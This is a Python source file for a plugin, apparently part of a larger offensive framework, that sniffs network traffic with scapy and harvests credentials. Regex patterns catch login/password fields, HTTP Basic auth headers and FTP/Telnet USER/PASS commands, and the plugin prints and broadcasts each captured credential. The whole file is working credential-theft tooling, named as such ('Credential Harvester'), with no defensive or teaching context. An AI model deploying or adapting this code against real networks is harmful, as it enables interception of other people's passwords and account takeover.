from core.plugin_manager import BasePlugin
from scapy.all import AsyncSniffer, IP, TCP, UDP, Raw
import asyncio
import re

class SnifferPlugin(BasePlugin):
    def __init__(self):
        self.sniffer = None
        self.credentials = []
        
        # Regex patterns for credential harvesting
        self.patterns = [
            r"(?i)(user|username|login|usr|pass|password|pwd|auth)\s*[:=]\s*([^&\s]+)",
            r"(?i)Authorization:\s*Basic\s*([a-zA-Z0-9+/=]+)",
            r"USER\s+([^\r\n]+)", # FTP/Telnet
            r"PASS\s+([^\r\n]+)"  # FTP/Telnet
        ]

    @property
    def name(self) -> str:
        return "Sniffer"

    @property
    def description(self) -> str:
        return "Professional DPI & Credential Harvester"

    async def start(self):
        self.sniffer = AsyncSniffer(prn=self._process_packet, store=False)
        self.sniffer.start()
        print("Sniffer: Deep Packet Inspection mode ACTIVE.")

    async def stop(self):
        if self.sniffer:
            self.sniffer.stop()
            print("Sniffer: Harvesting engine SUSPENDED.")

    def _process_packet(self, pkt):
        if IP in pkt:
            summary = {
                "src": pkt[IP].src,
                "dst": pkt[IP].dst,
                "proto": pkt[IP].proto,
                "len": len(pkt),
                "type": "PKT"
            }
            
            # Credential Extraction (DPI)
            if Raw in pkt:
                payload = pkt[Raw].load.decode(errors='ignore')
                found_creds = []
                for pattern in self.patterns:
                    matches = re.findall(pattern, payload)
                    if matches:
                        for m in matches:
                            cred = m if isinstance(m, str) else ":".join(m)
                            found_creds.append(cred)
                            summary["type"] = "AUTH"
                            summary["data"] = cred
                            print(f"[*] Sniffer: Captured Credential: {cred}")
                            self.emit("CREDENTIAL_FOUND", {"msg": f"Captured Credential: {cred}"})
                
                if found_creds:
                    self.credentials.extend(found_creds)

            # Emit every packet to the global bus
            self.emit("PACKET", summary)
